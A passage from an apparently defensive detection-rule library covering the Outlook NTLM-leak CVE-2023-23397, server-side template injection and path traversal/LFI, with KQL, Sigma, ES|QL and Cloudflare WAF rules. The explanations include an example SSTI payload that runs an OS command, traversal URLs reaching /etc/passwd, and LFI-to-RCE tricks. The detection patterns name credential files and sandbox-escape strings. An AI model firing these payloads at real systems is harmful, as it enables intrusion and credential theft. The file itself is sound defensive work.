        "CVE-2023-23397 is a critical Microsoft Outlook vulnerability that allows an attacker to steal a user's NTLM credential hash with zero user interaction. The attack works by sending an email containing a calendar appointment (or task/note) with the `PidLidReminderFileParameter` MAPI property set to a UNC path pointing to an attacker-controlled SMB share (e.g., `\\\\attacker-ip\\share\\sound.wav`). When Outlook processes the reminder - which happens automatically as soon as the client retrieves the message, often before the user even opens it - it attempts to play the 'reminder sound' from that UNC path, causing Windows to initiate an SMB connection and perform NTLM authentication against the attacker's server. The attacker's SMB server captures the NTLM authentication exchange (NetNTLMv2 hash), which can then be cracked offline or relayed in real-time to authenticate as the victim against other services.\n\nDetection has two angles: network-layer detection of outbound SMB (port 445) connections from client workstations to external/internet IP addresses - which should essentially never happen in a properly segmented network, since SMB is an internal protocol - and mail-flow/EDR detection of the malicious MAPI property itself if email content can be inspected (most reliably done via Microsoft's published PowerShell script to scan mailboxes for messages with `PidLidReminderFileParameter` set to a UNC path).",
    },
    variants: [
      {
        id: "rule-outlook-ntlm-leak-kql",
        language: "kql",
        platformVariant: "Microsoft Sentinel",
        title: "Outbound SMB Connection from Workstation to External IP",
        slug: "outbound-smb-external-ip-kql",
        descriptionSummary:
          "Detects outbound SMB (port 445) connection attempts from client workstations to external IP addresses, a strong indicator of NTLM hash leakage via CVE-2023-23397 or similar UNC-path-based credential theft techniques.",
        ruleBody: `// Outbound SMB to external/internet IPs - indicator of CVE-2023-23397 (Outlook NTLM leak)
// or other UNC-path credential theft (malicious .lnk/.url files, etc.)
// Data source: DeviceNetworkEvents (Microsoft Defender for Endpoint)
let InternalRanges = dynamic(["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]);
DeviceNetworkEvents
| where Timestamp >= ago(1d)
| where RemotePort == 445
| where ActionType == "ConnectionSuccess" or ActionType == "ConnectionAttempt"
| where not(ipv4_is_in_any_range(RemoteIP, InternalRanges))
| where RemoteIP !startswith "127."
| extend
    AccountCustomEntity = InitiatingProcessAccountName,
    IPCustomEntity = RemoteIP
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc

// --- Companion: Mailbox scan for malicious reminder sound UNC paths ---
// Run via Microsoft's published CVE-2023-23397 mailbox audit script (CVE-2023-23397.ps1)
// against Exchange Online / on-prem mailboxes to find messages with
// PidLidReminderFileParameter set to a \\\\<ip>\\share path.`,
        ruleFormatVersion: "Sentinel Analytics Rule / Defender Advanced Hunting",
        severity: "critical",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "Organizations with legitimate external SMB use cases (rare, but e.g., cloud-hosted file shares accessed directly over the internet rather than via VPN) will generate false positives - these should be explicitly allow-listed by destination IP/CIDR, and such configurations are themselves a security risk worth flagging separately since they expose NTLM authentication to the internet regardless of this specific CVE. In most enterprise networks, outbound port 445 to the internet should be blocked at the perimeter firewall entirely; this detection serves as a compensating control for environments where that egress rule has gaps, and as a detection for the specific moment of exploitation.",
        dataSourceRequirements:
          "Microsoft Defender for Endpoint DeviceNetworkEvents table, or equivalent firewall/netflow logs showing outbound connections with destination port 445 from endpoint subnets.",
        mitreTechniqueIds: ["T1187", "T1071.001"],
        cveIds: ["CVE-2023-23397"],
        tags: ["Outlook", "NTLM", "Credential Theft"],
        references: [
          {
            url: "https://nvd.nist.gov/vuln/detail/CVE-2023-23397",
            title: "NVD - CVE-2023-23397",
            referenceType: "cve_record",
          },
          {
            url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397",
            title: "Microsoft Security Response Center - CVE-2023-23397",
            referenceType: "vendor_advisory",
          },
        ],
      },
    ],
  },

  // --- Server-Side Template Injection (SSTI) ---
  {
    family: {
      id: "fam-server-side-template-injection",
      name: "Server-Side Template Injection (SSTI) Attempt",
      slug: "server-side-template-injection-attempt",
      categoryId: "cat-web-attacks",
      conceptDescription:
        "Server-Side Template Injection (SSTI) occurs when user-controlled input is embedded into a server-side template (Jinja2, Twig, Freemarker, Velocity, Smarty, Handlebars, etc.) and then rendered/evaluated by the templating engine, rather than being treated as inert data. Because templating engines are designed to execute logic - loops, conditionals, expressions, and in many cases arbitrary method calls on objects in scope - an attacker who can inject template syntax can often escape the intended sandbox and reach full remote code execution. The canonical example is a Flask/Jinja2 application that does `render_template_string(f\"Hello {user_input}\")` instead of passing `user_input` as a template variable: an attacker submitting `{{7*7}}` sees `49` reflected back (confirming injection), and can escalate to `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` or similar Python-object-traversal payloads to achieve OS command execution.\n\nSSTI is distinct from (and often confused with) Cross-Site Scripting (XSS): XSS payloads execute in the victim's browser, while SSTI payloads execute on the server itself, making SSTI typically far more severe - it's frequently a direct path to full server compromise rather than session/credential theft. SSTI most commonly arises in features that appear to need 'template-like' customization: custom email/notification templates, PDF/report generation with user-supplied formatting, search result 'did you mean' or error-message templates that echo user input, and any feature where an application advertises support for a templating mini-language to end users.\n\nDetection focuses on identifying template-engine-specific syntax delimiters (`{{ }}`, `{% %}`, `${ }`, `<#...#>`, `[% %]`) appearing in request parameters, especially when combined with method-chaining/attribute-access patterns characteristic of sandbox-escape payloads (`__class__`, `__globals__`, `__builtins__`, `__mro__`, `__subclasses__`, `config.items`, `self.__init__`) - these dunder/reflection-style attribute names have no legitimate use in normal form input and are the signature of SSTI exploitation tooling (tplmap, payloads from PayloadsAllTheThings) probing for which template engine is in use and attempting sandbox escape.",
    },
    variants: [
      {
        id: "rule-ssti-sigma",
        language: "sigma",
        platformVariant: "Web Server Access Logs",
        title: "Server-Side Template Injection (SSTI) Payload Patterns in Request Parameters",
        slug: "ssti-payload-patterns-sigma",
        descriptionSummary:
          "Detects template-engine delimiter syntax ({{ }}, {% %}, ${ }) combined with Python/Java reflection-style attribute access (__class__, __globals__, __builtins__) in HTTP request query strings or bodies - the signature of SSTI sandbox-escape probing.",
        ruleBody: `title: Server-Side Template Injection (SSTI) Payload in Request
id: 5d7e9f1a-3c5b-4d7e-9f1a-3c5b4d7e9f1a
status: stable
description: |
    Detects HTTP requests containing server-side templating engine delimiters
    (Jinja2/Twig {{ }} or {% %}, Freemarker/Velocity \${ } or <# #>) combined
    with reflection/sandbox-escape attribute names (__class__, __globals__,
    __builtins__, __mro__, __subclasses__, getClass, forName) - the signature
    of SSTI exploitation tooling (tplmap and similar) probing for or
    exploiting a server-side template injection vulnerability.
references:
    - https://portswigger.net/research/server-side-template-injection
    - https://attack.mitre.org/techniques/T1190/
author: Sentriq Detection Engineering
date: 2026-06-11
tags:
    - attack.initial-access
    - attack.t1190
    - attack.execution
logsource:
    category: webserver
detection:
    selection_delimiter:
        cs-uri-query|contains:
            - '{{'
            - '{%'
            - '\${'
            - '<#'
            - '[%'
    selection_escape_pattern:
        cs-uri-query|contains:
            - '__class__'
            - '__globals__'
            - '__builtins__'
            - '__mro__'
            - '__subclasses__'
            - '__init__'
            - 'getClass()'
            - 'forName('
            - 'self.__'
            - 'config.items'
    condition: selection_delimiter and selection_escape_pattern
falsepositives:
    - Applications that legitimately accept and reflect JSON or code snippets
      (API documentation tools, online code editors/playgrounds, JSON-based
      configuration UIs) may contain similar-looking syntax in normal
      payloads - scope this rule to endpoints that do not expect such input,
      or pair with response-code/response-size anomaly detection.
    - Authorized SSTI testing during a web application penetration test will
      trigger this rule by design.
level: high`,
        ruleFormatVersion: "Sigma Rule (YAML)",
        severity: "high",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "The combination of template delimiters AND reflection/dunder attribute names is rarely produced by normal application traffic - the most likely false-positive sources are developer tools (API playgrounds, GraphQL explorers, code-snippet sharing features) that legitimately pass code-like strings through request parameters, and authorized security testing (pentests, bug bounty researchers, internal red team SSTI probes using tplmap). For applications that legitimately accept template-like syntax as a feature (e.g., a notification-template editor for end users), scope this rule to exclude that specific endpoint and instead apply a tighter, application-specific allowlist of permitted template variables for that feature. A confirmed match outside of a known testing window should be investigated for evidence of successful exploitation - check application error logs for template-engine stack traces and outbound process-execution telemetry on the web server shortly after the request.",
        dataSourceRequirements:
          "Web server or reverse-proxy access logs with the full request query string and, ideally, request body captured (cs-uri-query / request body fields).",
        mitreTechniqueIds: ["T1190"],
        cveIds: [],
        tags: ["SSTI", "Template Injection", "RCE", "Jinja2", "Java"],
        references: [
          {
            url: "https://portswigger.net/research/server-side-template-injection",
            title: "PortSwigger Research - Server-Side Template Injection",
            referenceType: "blog_post",
          },
          {
            url: "https://attack.mitre.org/techniques/T1190/",
            title: "MITRE ATT&CK - Exploit Public-Facing Application",
            referenceType: "mitre_page",
          },
        ],
      },
      {
        id: "rule-ssti-cloudflare",
        language: "cloudflare",
        platformVariant: "WAF Custom Rule",
        title: "Block Server-Side Template Injection (SSTI) Sandbox-Escape Payloads",
        slug: "ssti-sandbox-escape-cloudflare",
        descriptionSummary:
          "Cloudflare WAF custom rule blocking requests containing template-engine delimiters combined with Python/Java reflection-style sandbox-escape attribute names, indicative of SSTI exploitation attempts.",
        ruleBody: `# Cloudflare WAF Custom Rule Expression
# Action: Managed Challenge (recommended initial rollout) or Block
# Field: Custom rule expression (Security -> WAF -> Custom rules)

(
  (
    http.request.uri.query contains "{{" or
    http.request.uri.query contains "{%" or
    http.request.body.raw contains "{{" or
    http.request.body.raw contains "{%"
  )
  and
  (
    http.request.uri.query contains "__class__" or
    http.request.uri.query contains "__globals__" or
    http.request.uri.query contains "__builtins__" or
    http.request.uri.query contains "__mro__" or
    http.request.uri.query contains "__subclasses__" or
    http.request.uri.query contains "config.items" or
    http.request.body.raw contains "__class__" or
    http.request.body.raw contains "__globals__" or
    http.request.body.raw contains "__builtins__" or
    http.request.body.raw contains "__mro__" or
    http.request.body.raw contains "__subclasses__" or
    http.request.body.raw contains "config.items"
  )
)
and not (ip.src in $known_scanner_allowlist)`,
        ruleFormatVersion: "Cloudflare WAF Custom Rules (Wirefilter syntax)",
        severity: "high",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "As with the Sigma variant, the main false-positive sources are developer-facing features that legitimately accept code-like syntax (API explorers, template editors) and authorized security testing. Deploy in Managed Challenge or Log-only mode first for any application with developer-tooling or template-customization features, and review matches before moving to Block. Maintain `$known_scanner_allowlist` for authorized pentest/bug-bounty source IPs during testing windows.",
        dataSourceRequirements:
          "Cloudflare WAF / Firewall Rules enabled on the zone, with query string and request body inspection (body inspection requires appropriate plan tier).",
        mitreTechniqueIds: ["T1190"],
        cveIds: [],
        tags: ["SSTI", "Template Injection", "RCE", "WAF"],
        references: [
          {
            url: "https://portswigger.net/research/server-side-template-injection",
            title: "PortSwigger Research - Server-Side Template Injection",
            referenceType: "blog_post",
          },
          {
            url: "https://attack.mitre.org/techniques/T1190/",
            title: "MITRE ATT&CK - Exploit Public-Facing Application",
            referenceType: "mitre_page",
          },
        ],
      },
    ],
  },

  // --- Path Traversal / Local File Inclusion (LFI) ---
  {
    family: {
      id: "fam-path-traversal-lfi",
      name: "Path Traversal / Local File Inclusion (LFI) Attempt",
      slug: "path-traversal-local-file-inclusion-attempt",
      categoryId: "cat-web-attacks",
      conceptDescription:
        "Path traversal (also called directory traversal) and Local File Inclusion (LFI) vulnerabilities occur when an application accepts a filename or path component as user input and uses it to access the filesystem - reading a file for display/download, or in LFI's case, including/executing it as code - without adequately validating that the resulting path stays within an intended directory. The classic exploitation pattern uses `../` (or its URL-encoded forms `%2e%2e%2f`, `%2e%2e/`, `..%2f`, double-encoded `%252e%252e%252f`, or backslash variants `..\\` on Windows) sequences to escape the intended directory and reach arbitrary files - `/download?file=../../../../etc/passwd` being the textbook example for Linux targets, or `..\\..\\..\\windows\\win.ini` on Windows.\n\nThe impact ranges from information disclosure (reading `/etc/passwd`, application configuration files containing database credentials, `.env` files, SSH private keys, or source code) to full remote code execution in LFI scenarios where the included file is then *executed* as code (PHP's `include()`/`require()` being the most common vector) - in this case, an attacker can often achieve RCE by 'including' a file they've influenced the content of, such as an uploaded image containing embedded PHP code, a log file poisoned with PHP via a crafted User-Agent or other logged header, or even `/proc/self/environ` on Linux (which contains environment variables including any the attacker can influence, like User-Agent, and is executable when included by PHP).\n\nDetection focuses on identifying traversal sequences (in both raw and URL-encoded/double-encoded forms) within request parameters that are commonly used for file-path purposes (parameters named `file`, `path`, `page`, `template`, `include`, `doc`, `filename`, or similar), as well as direct requests for well-known sensitive file targets (`/etc/passwd`, `/etc/shadow`, `win.ini`, `boot.ini`, `.env`, `web.config`, `wp-config.php`) appearing anywhere in the request - the presence of these specific filenames in a request to a web application (which should never need to reference them) is itself a strong indicator of LFI probing, independent of whether traversal sequences are also present (some LFI vulnerabilities don't require traversal at all if the vulnerable parameter already points into a directory near the target).",
    },
    variants: [
      {
        id: "rule-path-traversal-elastic",
        language: "elastic",
        platformVariant: "ES|QL / Web Server Access Logs",
        title: "Path Traversal Sequences or Sensitive File Targets in Web Request Parameters",
        slug: "path-traversal-lfi-request-parameters-elastic",
        descriptionSummary:
          "ES|QL query identifying web requests containing directory traversal sequences (../, URL-encoded variants) or direct references to sensitive file targets (/etc/passwd, web.config, .env, wp-config.php) in the URL, indicating path traversal or LFI exploitation attempts.",
        ruleBody: `// Path Traversal / LFI detection over web server access logs
// Data source: logs-* (web access logs with url.path / url.query mapped)
FROM logs-*
| WHERE @timestamp > NOW() - 1 DAY
| WHERE
    url.original RLIKE ".*(\\\\.\\\\.[\\\\/\\\\\\\\]|%2e%2e%2f|%2e%2e/|\\\\.\\\\.%2f|%252e%252e%252f).*"
    OR url.original RLIKE "(?i).*(etc/passwd|etc/shadow|win\\\\.ini|boot\\\\.ini|web\\\\.config|wp-config\\\\.php|\\\\.env|proc/self/environ).*"
| EVAL traversal_pattern = url.original RLIKE ".*(\\\\.\\\\.[\\\\/\\\\\\\\]|%2e%2e%2f|%2e%2e/|\\\\.\\\\.%2f|%252e%252e%252f).*"
| EVAL sensitive_target = url.original RLIKE "(?i).*(etc/passwd|etc/shadow|win\\\\.ini|boot\\\\.ini|web\\\\.config|wp-config\\\\.php|\\\\.env|proc/self/environ).*"
| KEEP @timestamp, source.ip, destination.ip, url.original, http.response.status_code, traversal_pattern, sensitive_target
| SORT @timestamp DESC`,
        ruleFormatVersion: "Elastic ES|QL",
        severity: "high",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.0",
        falsePositiveNotes:
          "Some legitimate applications use literal `..` in non-path contexts (date ranges like `2024..2025` in query parameters, mathematical/comparison expressions in search syntax) - these will not match the traversal regex, which specifically requires `..` followed by a path separator or its encoded equivalent, but verify against your application's URL conventions if false positives occur. Direct requests for sensitive filenames (`/etc/passwd`, `wp-config.php`, etc.) have essentially no legitimate use case in application traffic and should be treated as high-confidence scanning/exploitation regardless of traversal-sequence presence. A `http.response.status_code` of 200 on a sensitive-target match is significantly more concerning than a 403/404 - prioritize triage of 200-response matches, as these may indicate successful file disclosure rather than a blocked/failed attempt.",
        dataSourceRequirements:
          "Web server or reverse-proxy access logs ingested into an Elasticsearch logs-* data stream with url.original and http.response.status_code fields populated (standard with Elastic's web log integrations).",
        mitreTechniqueIds: ["T1190", "T1083", "T1552.001"],
        cveIds: [],
        tags: ["Path Traversal", "LFI", "Directory Traversal", "Information Disclosure"],
        references: [
          {
            url: "https://attack.mitre.org/techniques/T1190/",
            title: "MITRE ATT&CK - Exploit Public-Facing Application",
            referenceType: "mitre_page",
          },
          {
            url: "https://owasp.org/www-community/attacks/Path_Traversal",
            title: "OWASP - Path Traversal",
            referenceType: "documentation",
          },
        ],
      },
      {
        id: "rule-path-traversal-cloudflare",
        language: "cloudflare",
        platformVariant: "WAF Custom Rule",
        title: "Block Path Traversal Sequences and Sensitive File Path Requests",
        slug: "path-traversal-lfi-cloudflare",
        descriptionSummary:
          "Cloudflare WAF custom rule blocking requests containing directory traversal sequences (../, URL-encoded variants, backslash forms) or direct references to sensitive file targets such as /etc/passwd, wp-config.php, or .env.",
        ruleBody: `# Cloudflare WAF Custom Rule Expression
# Action: Block
# Field: Custom rule expression (Security -> WAF -> Custom rules)

(
  http.request.uri.path contains "../" or
  http.request.uri.path contains "..\\\\" or
  http.request.uri.query contains "../" or
  http.request.uri.query contains "..%2f" or
  http.request.uri.query contains "%2e%2e%2f" or
  http.request.uri.query contains "%252e%252e%252f" or
  http.request.uri contains "etc/passwd" or
  http.request.uri contains "etc/shadow" or
  http.request.uri contains "wp-config.php" or
  http.request.uri contains "web.config" or
  http.request.uri contains "win.ini" or
  http.request.uri contains "proc/self/environ"
)
and not (ip.src in $known_scanner_allowlist)`,
        ruleFormatVersion: "Cloudflare WAF Custom Rules (Wirefilter syntax)",
        severity: "high",
        status: "stable",
        author: "Sentriq Detection Engineering",
        ruleVersion: "1.1",
        falsePositiveNotes:
          "Applications that legitimately use `..` in query parameter values for non-path purposes (range expressions, version comparisons) are uncommon but possible - if encountered, narrow the `../`/`..\\\\` clauses to `http.request.uri.path` only (where literal traversal sequences have no legitimate purpose) and drop the broader `http.request.uri.query` traversal checks for that specific application, relying on the sensitive-filename checks (which remain low-FP regardless) as the primary signal. As with other WAF rules in this library, maintain `$known_scanner_allowlist` for authorized vulnerability scanning and pentest source IPs.",
        dataSourceRequirements:
          "Cloudflare WAF / Firewall Rules enabled on the zone, inspecting the request URI path and query string.",
        mitreTechniqueIds: ["T1190", "T1083"],
        cveIds: [],
        tags: ["Path Traversal", "LFI", "Directory Traversal", "WAF"],
        references: [
          {
            url: "https://attack.mitre.org/techniques/T1190/",
            title: "MITRE ATT&CK - Exploit Public-Facing Application",
            referenceType: "mitre_page",
          },
          {
            url: "https://owasp.org/www-community/attacks/Path_Traversal",
            title: "OWASP - Path Traversal",
            referenceType: "documentation",
          },
        ],
      },
    ],
  },
];
